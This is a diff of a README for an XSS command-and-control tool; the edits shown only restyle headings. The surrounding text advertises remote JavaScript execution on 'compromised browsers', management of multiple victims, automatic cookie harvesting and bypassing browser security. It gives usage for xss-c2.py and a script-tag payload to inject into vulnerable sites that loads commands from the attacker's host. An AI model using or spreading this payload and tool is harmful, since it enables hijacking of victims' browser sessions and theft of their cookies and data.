@@ -5,7 +5,7 @@
 <table style="width: 100%; border-collapse: collapse;"> <thead> <tr style="background: #f5f5f5;"> <th style="padding: 12px; text-align: left; border-bottom: 2px solid #ddd;">Feature</th> <th style="padding: 12px; text-align: left; border-bottom: 2px solid #ddd;">Description</th> </tr> </thead> <tbody> <tr> <td style="padding: 12px; border-bottom: 1px solid #ddd;">🎯 <strong>Real-time Control</strong></td> <td style="padding: 12px; border-bottom: 1px solid #ddd;">Execute JavaScript commands on compromised browsers</td> </tr> <tr> <td style="padding: 12px; border-bottom: 1px solid #ddd;">📊 <strong>Web Dashboard</strong></td> <td style="padding: 12px; border-bottom: 1px solid #ddd;">Beautiful admin interface with live results</td> </tr> <tr> <td style="padding: 12px; border-bottom: 1px solid #ddd;">👥 <strong>Multi-Victim</strong></td> <td style="padding: 12px; border-bottom: 1px solid #ddd;">Manage multiple browser sessions simultaneously</td> </tr> <tr> <td style="padding: 12px; border-bottom: 1px solid #ddd;">🔍 <strong>Auto Recon</strong></td> <td style="padding: 12px; border-bottom: 1px solid #ddd;">Automatic information gathering (cookies, IP, user agent)</td> </tr> <tr> <td style="padding: 12px; border-bottom: 1px solid #ddd;">⚡ <strong>Quick Commands</strong></td> <td style="padding: 12px; border-bottom: 1px solid #ddd;">One-click common reconnaissance tasks</td> </tr> <tr> <td style="padding: 12px; border-bottom: 1px solid #ddd;">🛡️ <strong>CORS Ready</strong></td> <td style="padding: 12px; border-bottom: 1px solid #ddd;">Bypasses modern browser security policies</td> </tr> <tr> <td style="padding: 12px; border-bottom: 1px solid #ddd;">📱 <strong>Responsive</strong></td> <td style="padding: 12px; border-bottom: 1px solid #ddd;">Works on desktop and mobile</td> </tr> </tbody> </table>
 
 
-<br><div class="warning" style="background: #fff3e0; border-left: 4px solid #ff9800; padding: 12px; margin: 20px 0; border-radius: 4px;"> <strong>How to use</strong></div>
+<br><div class="warning" style="background: #fff3e0; border-left: 4px solid #ff9800; padding: 12px; margin: 20px 0; border-radius: 4px;"> <strong> 🔧 How to use</strong></div>
 ```bash
 python3 xss-c2.py [-h] [-h HOST] [-p PORT]
 
@@ -14,7 +14,7 @@ optional arguments:
   -h HOST, --host HOST  Server IP address (default: 0.0.0.0 - all interfaces)
   -p PORT, --port PORT  Server port (default: 4545)
 ```
- ## Inject XSS Payload
+ <br><div class="warning" style="background: #fff3e0; border-left: 4px solid #ff9800; padding: 12px; margin: 20px 0; border-radius: 4px;"> <strong> 🚀 Inject XSS Payload</strong></div>
  Inject the following payload into vulnerable web applications:
  ```bash
 <script src="http://YOUR_IP:YOUR_PORT/cmd.js"></script>
